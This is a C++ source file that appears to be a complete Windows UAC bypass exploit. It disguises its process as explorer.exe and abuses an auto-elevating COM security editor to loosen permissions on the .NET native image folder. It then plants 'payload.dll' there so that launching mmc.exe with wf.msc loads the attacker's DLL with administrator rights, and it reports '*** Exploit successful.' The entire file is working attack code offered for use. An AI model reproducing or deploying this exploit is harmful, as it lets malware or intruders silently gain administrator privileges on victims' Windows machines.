#include <Windows.h>
#include <winternl.h>
#include <AccCtrl.h>
#include <ShlObj.h>
#include <wrl.h>
#include <iostream>
#include <string>
#include <memory>
using Microsoft::WRL::ComPtr;

EXTERN_C IMAGE_DOS_HEADER __ImageBase;

#define COUT_FAILED_HR(func, hr) (std::wcout << func << L"() failed. HRESULT: 0x" << std::hex << hr << std::endl)
#define COUT_FAILED_WIN32(func, err) (std::wcout << func << L"() failed. Error: " << err << std::endl)

constexpr GUID IID_ISecurityEditor{ 0x14B2C619, 0xD07A, 0x46EF, {0x8B, 0x62, 0x31, 0xB6, 0x4F, 0x3B, 0x84, 0x5C} };

typedef struct
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	// more stuff underneath . . .
} LDR_DATA_TABLE_ENTRY2, * PLDR_DATA_TABLE_ENTRY2;

struct ComSession
{
	HRESULT Result;
	ComSession() : Result(CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY))
	{}
	~ComSession()
	{
		if (SUCCEEDED(Result))
			CoUninitialize();
	}
};

struct ISecurityEditor : IUnknown
{
	virtual HRESULT WINAPI GetSecurity(
		LPCOLESTR ObjectName,
		SE_OBJECT_TYPE ObjectType,
		SECURITY_INFORMATION SecurityInfo,
		LPCOLESTR* ppSDDLStr
	) = 0;
	virtual HRESULT WINAPI SetSecurity(
		LPCOLESTR ObjectName,
		SE_OBJECT_TYPE ObjectType,
		SECURITY_INFORMATION SecurityInfo,
		LPCOLESTR pSDDLStr
	) = 0;
};

using PLDR_ENUM_CALLBACK = VOID(NTAPI*)(PLDR_DATA_TABLE_ENTRY2 entry, PVOID context, PBOOLEAN stop);

EXTERN_C NTSTATUS LdrEnumerateLoadedModules(ULONG flags, PLDR_ENUM_CALLBACK enumProc, PVOID context);

int wmain()
{
	auto hOutput{ GetStdHandle(STD_OUTPUT_HANDLE) };
	SetConsoleTextAttribute(hOutput, 8);
	std::wcout << L" __________              .___        __                      .__  __           /\\________  ____ \n" \
		L" \\______   \\___.__. ____ |   | _____/  |_  ____   ___________|__|/  |_ ___.__. )/\\_____  \\/_   |\n" \
		L"  |    |  _<   |  |/ __ \\|   |/    \\   __\\/ __ \\ / ___\\_  __ \\  \\   __<   |  |    /  ____/ |   |\n" \
		L"  |    |   \\\\___  \\  ___/|   |   |  \\  | \\  ___// /_/  >  | \\/  ||  |  \\___  |   /       \\ |   |\n" \
		L"  |______  // ____|\\___  >___|___|  /__|  \\___  >___  /|__|  |__||__|  / ____|   \\_______ \\|___|\n" \
		L"         \\/ \\/         \\/         \\/          \\/_____/                 \\/                \\/     \n\n";
	SetConsoleTextAttribute(hOutput, 7);

	ComSession comSession;
	if (FAILED(comSession.Result))
	{
		COUT_FAILED_HR(L"CoInitializeEx", comSession.Result);
		return 1;
	}

	PWSTR winPath;
	auto hr{ SHGetKnownFolderPath(FOLDERID_Windows, 0, nullptr, &winPath) };
	if (FAILED(hr))
	{
		COUT_FAILED_HR(L"SHGetKnownFolderPath", hr);
		return 1;
	}
	std::wstring explorer{ winPath }, asmPath{ winPath };
	CoTaskMemFree(winPath);
	explorer += L"\\explorer.exe";

	hr = LdrEnumerateLoadedModules(0, [](PLDR_DATA_TABLE_ENTRY2 entry, PVOID context, PBOOLEAN stop)
		{
			if (entry->DllBase == &__ImageBase)
			{
				entry->BaseDllName.Buffer = const_cast<PWSTR>(L"explorer.exe");
				entry->BaseDllName.Length = sizeof(L"explorer.exe");
				entry->BaseDllName.MaximumLength = sizeof(L"explorer.exe");

				entry->FullDllName.Buffer = const_cast<PWSTR>(reinterpret_cast<std::wstring*>(context)->c_str());
				entry->FullDllName.Length = static_cast<USHORT>((reinterpret_cast<std::wstring*>(context)->length() + 1) * sizeof WCHAR);
				entry->FullDllName.MaximumLength = static_cast<USHORT>(reinterpret_cast<std::wstring*>(context)->capacity());

				*stop = TRUE;
			}
		}, &explorer);
	if (FAILED(hr))
	{
		std::wcout << L"LdrEnumerateLoadedModules() failed. NTSTATUS: 0x" << std::hex << hr << std::endl;
		return 1;
	}

	ComPtr<ISecurityEditor> securityEditor;
	BIND_OPTS3 opts{};
	opts.cbStruct = sizeof BIND_OPTS3;
	opts.dwClassContext = CLSCTX_LOCAL_SERVER;

	hr = CoGetObject(L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}", &opts, IID_ISecurityEditor, &securityEditor);
	if (FAILED(hr))
	{
		COUT_FAILED_HR(L"CoGetObject", hr);
		return 1;
	}

	asmPath += L"\\assembly\\NativeImages_v4.0.30319_64";
	std::wstring workPath{ asmPath };
	LPCOLESTR oldSecurityPtr;
	hr = securityEditor->GetSecurity(asmPath.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, &oldSecurityPtr);
	if (FAILED(hr))
	{
		COUT_FAILED_HR(L"ISecurityEditor::GetSecurity", hr);
		return 1;
	}
	std::wstring oldSecurity{ oldSecurityPtr };
	CoTaskMemFree(reinterpret_cast<LPVOID>(const_cast<PWSTR>(oldSecurityPtr)));

	hr = securityEditor->SetSecurity(asmPath.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, L"D:PAI(A;OICI;FA;;;WD)");
	if (FAILED(hr))
	{
		COUT_FAILED_HR(L"ISecurityEditor::SetSecurity", hr);
		return 1;
	}

	workPath += L"\\MMCEx";
	std::wstring oldPathName{ workPath + L".old" }, originalPath{ workPath };
	auto restore{ true };
	if (!MoveFileW(workPath.c_str(), oldPathName.c_str()))
	{
		if (GetLastError() != ERROR_FILE_NOT_FOUND)
		{
			securityEditor->SetSecurity(asmPath.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, oldSecurity.c_str());
			COUT_FAILED_WIN32(L"MoveFileW", GetLastError());
			return 1;
		}
		restore = false;
	}

	if (!CreateDirectoryW(workPath.c_str(), nullptr))
	{
		if (restore)
			MoveFileW(oldPathName.c_str(), originalPath.c_str());

		securityEditor->SetSecurity(asmPath.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, oldSecurity.c_str());
		COUT_FAILED_WIN32(L"CreateDirectoryW", GetLastError());
		return 1;
	}

	workPath += L"\\DEADBEEFDEADBEEFDEADBEEFDEADBEEF";
	if (!CreateDirectoryW(workPath.c_str(), nullptr))
	{
		RemoveDirectoryW(originalPath.c_str());

		if (restore)
			MoveFileW(oldPathName.c_str(), originalPath.c_str());

		securityEditor->SetSecurity(asmPath.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, oldSecurity.c_str());
		COUT_FAILED_WIN32(L"CreateDirectoryW", GetLastError());
		return 1;
	}

	auto niPath{ workPath + L"\\MMCEx.ni.dll" }, auxPath{ workPath + L"\\MMCEx.ni.dll.aux" };
	if (!MoveFileW(L"payload.dll", niPath.c_str()))
	{
		RemoveDirectoryW(workPath.c_str());
		RemoveDirectoryW(originalPath.c_str());

		if (restore)
			MoveFileW(oldPathName.c_str(), originalPath.c_str());

		securityEditor->SetSecurity(asmPath.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, oldSecurity.c_str());
		COUT_FAILED_WIN32(L"MoveFileW", GetLastError());
		return 1;
	}
	if (!MoveFileW(L"MMCEx.ni.dll.aux", auxPath.c_str()))
	{
		DeleteFileW(niPath.c_str());
		RemoveDirectoryW(workPath.c_str());
		RemoveDirectoryW(originalPath.c_str());

		if (restore)
			MoveFileW(oldPathName.c_str(), originalPath.c_str());

		securityEditor->SetSecurity(asmPath.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, oldSecurity.c_str());
		COUT_FAILED_WIN32(L"MoveFileW", GetLastError());
		return 1;
	}

	auto execResult{ reinterpret_cast<int>(ShellExecuteW(nullptr, L"runas", L"mmc.exe", L"wf.msc", nullptr, SW_NORMAL)) };
	Sleep(1500);
	DeleteFileW(auxPath.c_str());
	DeleteFileW(niPath.c_str());
	RemoveDirectoryW(workPath.c_str());
	RemoveDirectoryW(originalPath.c_str());
	if (restore)
		MoveFileW(oldPathName.c_str(), originalPath.c_str());
	securityEditor->SetSecurity(asmPath.c_str(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, oldSecurity.c_str());
	if (execResult <= 32)
	{
		COUT_FAILED_WIN32(L"ShellExecuteW", execResult);
		return 1;
	}

	SetConsoleTextAttribute(hOutput, 15);
	std::wcout << L"[+] ";
	SetConsoleTextAttribute(hOutput, 14);
	std::wcout << L"*** Exploit successful.\n\n";
	SetConsoleTextAttribute(hOutput, 7);

	return 0;
}